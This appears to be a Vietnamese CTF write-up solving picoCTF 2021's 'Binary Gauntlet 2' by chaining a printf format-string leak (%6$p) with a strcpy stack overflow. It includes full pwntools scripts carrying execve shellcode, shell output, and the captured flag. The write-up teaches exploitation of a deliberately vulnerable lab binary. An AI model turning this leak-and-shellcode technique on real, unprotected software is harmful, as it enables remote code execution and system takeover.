# Binary Gauntlet 2
[Tham khảo binay gaunlet 1](../Binary-Gauntlet-1)

## Kiểm tra file
### file
```bash
gauntlet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2335fe540c6db20a6fba7947a73b044afebe221b, not stripped
```

### checksec
```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

## Decompile & Disassemble
### Decompile `main`
```c
undefined8 main(void)
{
  char local_78 [104];
  char *local_10;
  
  local_10 = (char *)malloc(1000);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  printf(local_10);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  strcpy(local_78,local_10);
  return 0;
}
```
Lần này chúng ta không được cung cấp địa chỉ của biến nữa. Ta cũng được cho biết rằng ASLR sẽ được bật ở host. Vì vậy ta phải tự leak lấy địa chỉ của biến để return về.

Còn nhớ về lỗi Format String mà tôi nhắc đến ở [binary gauntlet 0](../Binary-Gauntlet-0) chứ ? Bây giờ chúng ta sẽ tận dụng nó.

### Đôi chút về Format String ở x64
Khi truyền đối số vào hàm, các đối số từ 0 -> 5 sẽ được chứa trong các thanh ghi lần lượt là  RDI, RSI, RDX, RCX, R8, R9, đối số thứ 6 trở đi sẽ được đưa vào stack. Vậy nếu tại `fgets` đầu tiên, nếu ta nhập vào "%p %p %p %p %p %p" thì `printf` đầu tiên sẽ in ra màn hình lần lượt là nội dung thanh ghi RSI, RDX, RCX, R8, R9 rồi đến nội dung của ô nhớ trên stack ngay bên trên return address của hàm `printf` (Nội dung thanh ghi RDI không được in ra vì nó chứa chuỗi định dạng). Bằng cách này ta có thể đọc được bất kì ô nhớ nào trên stack mà ta muốn, ta chỉ việc tìm offset từ hàm `printf` đến nơi mà ta muốn đọc vì stack cũng chỉ là 1 dãy các ô nhớ liên tiếp với nhau.

Trên stack cũng chứa đầy những con trỏ trỏ đến một ô nhớ nào đó trên stack, tức là một ô nhớ chứa địa chỉ của một ô nhớ khác trên stack (Sound confusing eh ?). Debug chương trình và đặt breakpoint tại hàm `main` ta sẽ thấy được điều này
```bash
gef➤  x/20gx $rbp
0x7fffffffde40: 0x0000000000000000  0x00007ffff7deb0b3
0x7fffffffde50: 0x00007ffff7ffc620  0x00007fffffffdf38
0x7fffffffde60: 0x0000000100000000  0x0000000000400687
0x7fffffffde70: 0x0000000000400730  0xab124923a67f8c7e
0x7fffffffde80: 0x00000000004005a0  0x00007fffffffdf30
0x7fffffffde90: 0x0000000000000000  0x0000000000000000
0x7fffffffdea0: 0x54edb6dc1adf8c7e  0x54eda69ec6b18c7e
0x7fffffffdeb0: 0x0000000000000000  0x0000000000000000
0x7fffffffdec0: 0x0000000000000000  0x0000000000000001
0x7fffffffded0: 0x00007fffffffdf38  0x00007fffffffdf48
```
2 ô nhớ cuối cùng được in ra đang chứa địa chỉ của 2 ô nhớ trên stack
```bash
0x7fffffffded0: 0x00007fffffffdf38  0x00007fffffffdf48
```
Vì ở host ASLR sẽ được bật, nên ta sẽ bật ASLR và debug lại chương trình
```bash
gef➤  x/20gx $rbp
0x7ffd53335f90: 0x0000000000000000  0x00007f1eed7ba0b3
0x7ffd53335fa0: 0x00007f1eed9c5620  0x00007ffd53336088
0x7ffd53335fb0: 0x0000000100000000  0x0000000000400687
0x7ffd53335fc0: 0x0000000000400730  0x9cb5dd652d089fe9
0x7ffd53335fd0: 0x00000000004005a0  0x00007ffd53336080
0x7ffd53335fe0: 0x0000000000000000  0x0000000000000000
0x7ffd53335ff0: 0x634f7b0392489fe9  0x628807926dc69fe9
0x7ffd53336000: 0x0000000000000000  0x0000000000000000
0x7ffd53336010: 0x0000000000000000  0x0000000000000001
0x7ffd53336020: 0x00007ffd53336088  0x00007ffd53336098
```
Để ý rằng các địa chỉ đã thay đổi, nhưng offset giữa những ô nhớ thì vẫn giữ nguyên
```bash
0x7fffffffded0: 0x00007fffffffdf38  0x00007fffffffdf48
```
-> 0x00007fffffffdf48 - 0x00007fffffffdf38 = 0x10
```bash
0x7fffffffded0: 0x00007fffffffdf38  0x00007fffffffdf48
```
-> 0x00007ffd53336098 - 0x00007ffd53336088 = 0x10

Vậy ta chỉ việc leak 1 địa chỉ nào đó trên stack, sau đó tìm offset giữa địa chỉ đó và địa chỉ của biến `local_78` và ta sẽ có được địa chỉ để return về.

Ta sẽ tắt ASLR và chạy lại chương trình. Ta thử nhập 10 "%p" vào `fgets` đầu tiên xem chúng ta sẽ nhận được những gì
```bash
%p %p %p %p %p %p %p %p %p %p
0x602691 (nil) 0x6026ae 0x6022a0 0x7c 0x7fffffffdf38 0x100000000 (nil) (nil) 0x400040
```
Ta thấy tại %p thứ 6 là địa chỉ của 1 ô nhớ trên stack ta có thể sử dụng địa chỉ này để tính toán offset đến biến `local_78`. Có thể dùng "%6$p" để chỉ lấy giá trị tại %p thứ 6.

Ta nhập 1 đống chữ A vào `fgets` thứ 2 để tìm vị trí biến `local_78`
```bash
gef➤  x/20gx $rsp
0x7fffffffddc0: 0x00007fffffffdf38  0x0000000100000000
0x7fffffffddd0: 0x4141414141414141  0x4141414141414141
0x7fffffffdde0: 0x4141414141414141  0x4141414141414141
0x7fffffffddf0: 0x4141414141414141  0x4141414141414141
0x7fffffffde00: 0x4141414141414141  0x4141414141414141
0x7fffffffde10: 0x4141414141414141  0x4141414141414141
0x7fffffffde20: 0x4141414141414141  0x00000a4141414141
0x7fffffffde30: 0x00007fffffffdf30  0x00000000006022a0
0x7fffffffde40: 0x0000000000000000  0x00007ffff7deb0b3
0x7fffffffde50: 0x00007ffff7ffc620  0x00007fffffffdf38
```
Biến `local_78` bắt đầu từ 0x7fffffffddd0. Offset sẽ = 0x7fffffffdf38 - 0x7fffffffddd0 = **0x168**

### Disassemble `main`
```asm
0x0000000000400687 <+0>:   push   rbp
0x0000000000400688 <+1>:   mov    rbp,rsp
0x000000000040068b <+4>:   add    rsp,0xffffffffffffff80
0x000000000040068f <+8>:   mov    DWORD PTR [rbp-0x74],edi
0x0000000000400692 <+11>:  mov    QWORD PTR [rbp-0x80],rsi
0x0000000000400696 <+15>:  mov    edi,0x3e8
0x000000000040069b <+20>:  call   0x400580 <malloc@plt>
0x00000000004006a0 <+25>:  mov    QWORD PTR [rbp-0x8],rax
0x00000000004006a4 <+29>:  mov    rdx,QWORD PTR [rip+0x2009b5]        # 0x601060 <stdin@@GLIBC_2.2.5>
0x00000000004006ab <+36>:  mov    rax,QWORD PTR [rbp-0x8]
0x00000000004006af <+40>:  mov    esi,0x3e8
0x00000000004006b4 <+45>:  mov    rdi,rax
0x00000000004006b7 <+48>:  call   0x400570 <fgets@plt>
0x00000000004006bc <+53>:  mov    rax,QWORD PTR [rbp-0x8]
0x00000000004006c0 <+57>:  add    rax,0x3e7
0x00000000004006c6 <+63>:  mov    BYTE PTR [rax],0x0
0x00000000004006c9 <+66>:  mov    rax,QWORD PTR [rbp-0x8]
0x00000000004006cd <+70>:  mov    rdi,rax
0x00000000004006d0 <+73>:  mov    eax,0x0
0x00000000004006d5 <+78>:  call   0x400560 <printf@plt>
0x00000000004006da <+83>:  mov    rax,QWORD PTR [rip+0x20096f]        # 0x601050 <stdout@@GLIBC_2.2.5>
0x00000000004006e1 <+90>:  mov    rdi,rax
0x00000000004006e4 <+93>:  call   0x400590 <fflush@plt>
0x00000000004006e9 <+98>:  mov    rdx,QWORD PTR [rip+0x200970]        # 0x601060 <stdin@@GLIBC_2.2.5>
0x00000000004006f0 <+105>: mov    rax,QWORD PTR [rbp-0x8]
0x00000000004006f4 <+109>: mov    esi,0x3e8
0x00000000004006f9 <+114>: mov    rdi,rax
0x00000000004006fc <+117>: call   0x400570 <fgets@plt>
0x0000000000400701 <+122>: mov    rax,QWORD PTR [rbp-0x8]
0x0000000000400705 <+126>: add    rax,0x3e7
0x000000000040070b <+132>: mov    BYTE PTR [rax],0x0
0x000000000040070e <+135>: mov    rdx,QWORD PTR [rbp-0x8]
0x0000000000400712 <+139>: lea    rax,[rbp-0x70]
0x0000000000400716 <+143>: mov    rsi,rdx
0x0000000000400719 <+146>: mov    rdi,rax
0x000000000040071c <+149>: call   0x400550 <strcpy@plt>
0x0000000000400721 <+154>: mov    eax,0x0
0x0000000000400726 <+159>: leave  
0x0000000000400727 <+160>: ret    
```
Từ `local_78` đến return address của `main` là **0x78** bytes.

## Exploit
### Local
```python
from pwn import *

context.binary = ELF("./gauntlet")

run = process("./gauntlet")

run.sendline("%6$p")
leaked = int(run.recv().strip(), 16)

buf = leaked - 0x168

payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload += b'A' * (0x78 - len(payload))
payload += p64(buf)

run.sendline(payload)

run.interactive()
```
### Local output
```bash
[*] '/home/revirven/Desktop/GitHub/CTF-Writeups/PicoCTF-2021/Binary-Exploitation/Binary-Gauntlet-2/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process './gauntlet': pid 3560
[*] Switching to interactive mode
$ whoami
revirven
$  
```
Offset ở remote target system sẽ có chút khác biệt so với local (Offset từ địa chỉ bị leak đến `local_78` là **0x158** thay vì **0x168**)

### Remote
```python
from pwn import *

context.binary = ELF("./gauntlet")


run = remote("mercury.picoctf.net", 4349)

run.sendline("%6$p")
leaked = int(run.recv().strip(), 16)

buf = leaked - 0x158

payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload += b'A' * (0x78 - len(payload))
payload += p64(buf)

run.sendline(payload)

run.interactive()
```
### Remote output
```bash
[*] '/home/revirven/Desktop/GitHub/CTF-Writeups/PicoCTF-2021/Binary-Exploitation/Binary-Gauntlet-2/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to mercury.picoctf.net on port 4349: Done
[*] Switching to interactive mode
$ cat flag.txt
bcf25d0f5d43dc2d9a40016f9d261819
$
```